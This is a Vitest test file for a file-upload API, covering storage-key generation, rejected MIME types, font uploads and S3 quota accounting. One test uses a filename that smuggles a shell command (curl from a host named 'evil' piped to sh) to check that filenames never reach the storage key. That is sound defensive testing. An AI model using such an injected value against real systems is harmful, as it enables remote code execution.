import { describe, expect, it, vi } from 'vitest';
import { api, createUser } from './helpers';
import { File } from '../src/models/File';
import { User } from '../src/models/User';
import { getObjectSize } from '../src/services/storage.service';

vi.mock('../src/services/storage.service', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../src/services/storage.service')>();
  return {
    ...actual,
    createPresignedUpload: vi.fn(async ({ key }: { key: string }) => ({ url: 'https://s3.test/', fields: { key } })),
    getObjectSize: vi.fn(async () => 5000 as number | null),
    deleteFromS3: vi.fn(async () => undefined),
  };
});

describe('POST /files/upload-url', () => {
  it('builds the storage key from the MIME type, never the filename', async () => {
    const { user, auth } = await createUser();
    const res = await api()
      .post('/api/v1/files/upload-url')
      .set(auth)
      .send({ filename: 'a.mp4";curl${IFS}evil|sh;"', mimeType: 'video/mp4', size: 1000 });
    expect(res.status).toBe(200);
    const file = await File.findById(res.body.fileId);
    expect(file!.storageKey).toMatch(new RegExp(`^users/${user._id}/uploads/[0-9a-f-]{36}\\.mp4$`));
    expect(file!.cdnUrl).toMatch(/^https:\/\/cdn\.test\/users\/[0-9a-f]+\/uploads\/[0-9a-f-]{36}\.mp4$/);
    // The original name is kept only as display text.
    expect(file!.originalName).toBe('a.mp4";curl${IFS}evil|sh;"');
  });

  it('rejects file types that are not allowed', async () => {
    const { auth } = await createUser();
    const res = await api().post('/api/v1/files/upload-url').set(auth).send({ filename: 'x.sh', mimeType: 'application/x-sh', size: 10 });
    expect(res.status).toBe(400);
    expect(res.body.code).toBe('UNSUPPORTED_FILE_TYPE');
  });

  it('accepts fonts sent without a MIME type', async () => {
    const { auth } = await createUser();
    const res = await api().post('/api/v1/files/upload-url').set(auth).send({ filename: 'Brand.otf', mimeType: 'application/octet-stream', size: 10 });
    expect(res.status).toBe(200);
    expect(res.body.cdnUrl).toMatch(/\.otf$/);
  });
});

describe('storage accounting', () => {
  async function upload(auth: Record<string, string>, size = 1000) {
    const res = await api().post('/api/v1/files/upload-url').set(auth).send({ filename: 'p.png', mimeType: 'image/png', size });
    expect(res.status).toBe(200);
    return res.body.fileId as string;
  }
  const storageUsed = async (userId: unknown) => (await User.findById(userId))!.quotaUsage.storageUsed;

  it('charges the size that landed in S3, once, and refunds it once on delete', async () => {
    const { user, auth } = await createUser();
    const fileId = await upload(auth, 1000);
    expect((await api().post(`/api/v1/files/${fileId}/complete`).set(auth)).status).toBe(200);
    expect((await api().post(`/api/v1/files/${fileId}/complete`).set(auth)).status).toBe(200);
    expect(await storageUsed(user._id)).toBe(5000);
    expect((await File.findById(fileId))!.size).toBe(5000);

    await api().delete(`/api/v1/files/${fileId}`).set(auth);
    await api().delete(`/api/v1/files/${fileId}`).set(auth);
    expect(await storageUsed(user._id)).toBe(0);
  });

  it("doesn't mark an upload ready if nothing reached S3", async () => {
    const { user, auth } = await createUser();
    const fileId = await upload(auth);
    vi.mocked(getObjectSize).mockResolvedValueOnce(null);
    const res = await api().post(`/api/v1/files/${fileId}/complete`).set(auth);
    expect(res.status).toBe(400);
    expect(res.body.code).toBe('UPLOAD_NOT_FOUND');
    expect(await storageUsed(user._id)).toBe(0);
  });

  it('refuses an upload bigger than the storage left, with a clear code', async () => {
    const { auth } = await createUser();
    const res = await api().post('/api/v1/files/upload-url').set(auth).send({ filename: 'p.png', mimeType: 'image/png', size: 1e12 });
    expect(res.status).toBe(403);
    expect(res.body.code).toBe('STORAGE_LIMIT_EXCEEDED');
  });
});
